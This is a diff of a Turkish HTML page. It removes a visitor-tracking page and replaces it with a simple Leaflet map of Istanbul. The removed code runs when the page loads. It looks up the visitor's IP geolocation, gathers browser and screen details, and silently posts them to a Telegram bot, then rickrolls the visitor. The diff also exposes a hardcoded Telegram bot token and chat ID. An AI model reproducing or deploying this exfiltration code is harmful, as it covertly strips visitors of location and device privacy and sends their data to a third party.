@@ -2,202 +2,52 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title></title>
+  <title>Harita Test</title>
   <style>
-    html, body {
-      margin: 0; padding: 0; width: 100%; height: 100%;
-      background: black;
-      color: #00ff00;
-      font-family: monospace, monospace;
-      overflow: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    #container {
-      width: 90vw;
-      max-width: 800px;
-      height: 85vh;
-      background-color: black;
-      border-radius: 8px;
-      padding: 20px;
-      box-sizing: border-box;
-      overflow-y: auto;
-      box-shadow: 0 0 20px #00ff00;
-      white-space: pre-wrap;
-      user-select: none;
-      display: flex;
-      flex-direction: column;
-    }
-    #terminal {
-      flex: 1 1 auto;
-      overflow-y: auto;
-      margin-bottom: 15px;
-      font-size: 14px;
-      line-height: 1.4;
-    }
     #map {
-      flex: 0 0 300px;
+      height: 400px; /* Haritanın yüksekliği kesin olmalı */
+      width: 100%;
       border: 2px solid #00ff00;
       border-radius: 6px;
-      margin-bottom: 20px;
     }
-    #rickrollButton {
-      background: #00ff00;
-      color: black;
-      padding: 18px 40px;
-      border: none;
-      border-radius: 10px;
-      font-weight: bold;
-      cursor: pointer;
-      user-select: none;
-      font-size: 20px;
-      align-self: center;
-      transition: background 0.3s ease;
-      box-shadow: 0 0 15px #00ff00;
-    }
-    #rickrollButton:hover {
-      background: #00cc00;
-      box-shadow: 0 0 25px #00ff00;
+    body {
+      margin:0; padding:0;
+      background: black;
+      color: #00ff00;
+      font-family: monospace;
     }
   </style>
-
-  <!-- Leaflet CSS -->
-  <link
-    rel="stylesheet"
-    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
-    integrity="sha256-sA+U2Yp6gZtwTbGGV2urNfmnm6Rd2f2qJzG5/1oGPPM="
+  <link 
+    rel="stylesheet" 
+    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" 
+    integrity="sha256-sA+U2Yp6gZtwTbGGV2urNfmnm6Rd2f2qJzG5/1oGPPM=" 
     crossorigin=""
   />
 </head>
 <body>
-  <div id="container">
-    <pre id="terminal"></pre>
-    <div id="map"></div>
-    <button id="rickrollButton" style="display:none;">Sürpriz İçin Tıkla</button>
-  </div>
+  <h1>Harita Test</h1>
+  <div id="map"></div>
 
-  <!-- Leaflet JS -->
-  <script
-    src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
-    integrity="sha256-o0FPCeSZkXbZ0L/oc1jyC4ikQtc6Os+uH6VJ23JM9v0="
-    crossorigin=""
-  ></script>
-
+  <script 
+    src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" 
+    integrity="sha256-o0FPCeSZkXbZ0L/oc1jyC4ikQtc6Os+uH6VJ23JM9v0=" 
+    crossorigin="">
+  </script>
   <script>
-    const terminal = document.getElementById('terminal');
-    const button = document.getElementById('rickrollButton');
+    // İstanbul koordinatları örnek
+    const lat = 41.0082;
+    const lon = 28.9784;
 
-    function logToTerminal(text) {
-      terminal.textContent += text + '\n';
-      terminal.scrollTop = terminal.scrollHeight;
-    }
+    const map = L.map('map').setView([lat, lon], 13);
 
-    function getCurrentTime() {
-      return new Date().toLocaleString();
-    }
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      maxZoom: 19,
+      attribution: '&copy; OpenStreetMap contributors'
+    }).addTo(map);
 
-    function decToDMS(deg) {
-      const absolute = Math.abs(deg);
-      const degrees = Math.floor(absolute);
-      const minutes = ((absolute - degrees) * 60).toFixed(1);
-      return {degrees, minutes};
-    }
-
-    function formatCoordinate(lat, lon) {
-      const latDMS = decToDMS(lat);
-      const lonDMS = decToDMS(lon);
-      const latCardinal = lat >= 0 ? "Kuzey" : "Güney";
-      const lonCardinal = lon >= 0 ? "Doğu" : "Batı";
-
-      return `${latDMS.degrees}°${latDMS.minutes}' ${latCardinal}, ${lonDMS.degrees}°${lonDMS.minutes}' ${lonCardinal}`;
-    }
-
-    async function sendToTelegram(message) {
-      const chatId = "6400737507"; // Senin chat ID'in
-      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-      try {
-        await fetch(url, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-          })
-        });
-      } catch(e) {
-        // Hata olursa sessizce geç
-      }
-    }
-
-    async function collectData() {
-      logToTerminal(`[${getCurrentTime()}] Veriler toplanıyor...`);
-
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-
-        const coordsFormatted = formatCoordinate(data.latitude, data.longitude);
-
-        const message = `Gizli Veri:\n` +
-          `IP: ${data.ip}\n` +
-          `Şehir: ${data.city}\n` +
-          `Bölge: ${data.region}\n` +
-          `Posta Kodu: ${data.postal}\n` +
-          `Ülke: ${data.country_name}\n` +
-          `ISP: ${data.org}\n` +
-          `Koordinatlar: ${coordsFormatted}\n\n` +
-
-          `Tarayıcı Bilgileri:\n` +
-          `User Agent: ${navigator.userAgent}\n` +
-          `Dil: ${navigator.language}\n` +
-          `Platform: ${navigator.platform}\n` +
-          `Çerez Durumu: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
-          `Bağlantı Türü: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}\n\n` +
-
-          `Ekran Bilgileri:\n` +
-          `Çözünürlük: ${screen.width}x${screen.height}\n` +
-          `Renk Derinliği: ${screen.colorDepth}\n` +
-          `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
-          `Şu anki Saat: ${getCurrentTime()}`;
-
-        logToTerminal(message);
-
-        await sendToTelegram(message);
-
-        // Haritayı göster
-        showMap(data.latitude, data.longitude);
-
-      } catch(e) {
-        logToTerminal(`[${getCurrentTime()}] Veri toplanırken hata oluştu.`);
-      }
-
-      addButton();
-    }
-
-    function showMap(lat, lon) {
-      const map = L.map('map').setView([lat, lon], 13);
-
-      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        attribution: '&copy; OpenStreetMap contributors',
-        maxZoom: 18,
-      }).addTo(map);
-
-      L.marker([lat, lon]).addTo(map)
-        .bindPopup(`Konumunuz: ${formatCoordinate(lat, lon)}`)
-        .openPopup();
-    }
-
-    function addButton() {
-      button.style.display = 'inline-block';
-      button.onclick = () => {
-        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-      };
-    }
-
-    collectData();
+    L.marker([lat, lon]).addTo(map)
+      .bindPopup('İstanbul')
+      .openPopup();
   </script>
 </body>
 </html>
